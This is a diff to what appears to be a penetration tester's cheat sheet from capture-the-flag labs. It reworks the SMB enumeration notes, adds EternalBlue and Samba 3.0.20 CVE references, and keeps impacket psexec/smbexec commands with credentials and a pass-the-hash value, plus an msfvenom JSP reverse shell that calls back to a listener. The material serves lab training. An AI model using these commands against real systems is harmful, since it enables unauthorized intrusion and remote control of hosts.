@@ -376,14 +376,19 @@ https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/
                 nmap <ip> --script=msrpc-enum
                 https://en.wikipedia.org/wiki/Microsoft_RPC    --> Windows rpc port
 139/ 445 SMB SAMBA
-	    https://book.hacktricks.xyz/pentesting/pentesting-smb
-	    smbmap -H <IP>
-	    smbmap -d active.htb -u svc_tgs -p <password> -H 10.10.10.100 -R Users
-
-	    python smbexec.py user:password@192.168.1.2
-	    python psexec.py user:password@192.168.1.2
-	    python psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c user@192.168.1.2 cmd.exe
-	    enum4linux -a <ip>
+	smbv1 = Ethernal Blue, MS17-010/ CVE-2017-0144 for windows system
+		Identify SMB version with nmap command:
+			nmap -p445 --script smb-protocols <target>
+			Wireshark: SMB OPCODE, \xFF SMB for 
+	
+	
+	https://book.hacktricks.xyz/pentesting/pentesting-smb
+	smbmap -H <IP>
+	smbmap -d active.htb -u svc_tgs -p <password> -H 10.10.10.100 -R Users
+	python smbexec.py user:password@192.168.1.2
+	python psexec.py user:password@192.168.1.2
+	python psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c user@192.168.1.2 cmd.exe
+	enum4linux -a <ip>
              2020 Kali default setting does not allow the legacy SMB protocols. Change it by /etc/samba/smb.conf  and add "client min protocol = LANMAN1" to the global section.
             
                 smbclient -L <ip>
@@ -650,7 +655,11 @@ Microsoft IIs version
                   https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/
 8.0	Built-in component of Windows 8 and Windows Server 2012.	Windows 8 and Windows Server 2012
 
-     
+
+
+Samba3.0.20 -->CVE 2007-2447 
+
+
  Cold fusion8
          Uses JSF
          msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.47 LPORT=443 -f raw > shell.jsp
